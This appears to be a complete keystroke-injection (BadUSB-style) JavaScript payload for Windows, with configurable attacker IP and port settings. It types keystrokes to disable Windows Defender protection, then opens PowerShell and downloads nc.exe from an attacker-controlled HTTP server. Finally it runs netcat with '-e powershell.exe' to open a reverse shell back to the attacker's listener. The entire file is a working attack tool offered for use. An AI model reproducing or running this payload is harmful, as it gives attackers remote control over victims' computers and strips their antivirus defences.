// Change to your netcat listener IP
var IP = "10.0.0.1";

// Change to your netcat listener Port
var PORT = "8000";

// Change to your http server IP for download nc.exe
var HTTP_IP = "10.0.0.1";

// Change to your http server Port
var HTTP_PORT = "80";

// Disable windows defender
function disable_defender(){
  layout('es');
  press("GUI");
  delay(500);
  type("windows security")
  delay(2500);
  press("ENTER");
  delay(2000);
  press("ENTER");
  delay(600);
  press("TAB");
  delay(600);
  press("TAB");
  delay(600);
  press("TAB");
  delay(600);
  press("TAB");
  delay(600);
  press("ENTER");
  delay(1000);
  press("SPACE");
  delay(1000);
  press("ALT s");
  delay(1000);
  press("ALT F4");
}

// send reverse shell
function popshell(IP, PORT){
  delay(500);
  type("mkdir C:/temp/temp");
  delay(500);
  press("ENTER");
  type('Invoke-WebRequest -URI http://' + HTTP_IP + ':' + HTTP_PORT + '/nc.exe -OutFile C:/temp/temp/nc.exe');
  delay(500);
  press("ENTER");
  type('C:/temp/temp/nc.exe -e powershell.exe ' + IP + ' ' + PORT);
  press("ENTER");

}

//main
layout("es"); 
typingSpeed(0,0);

disable_defender();
delay(1000);
press("GUI r");
delay(500);
type("powershell\n");
delay(500);
popshell(IP, PORT);
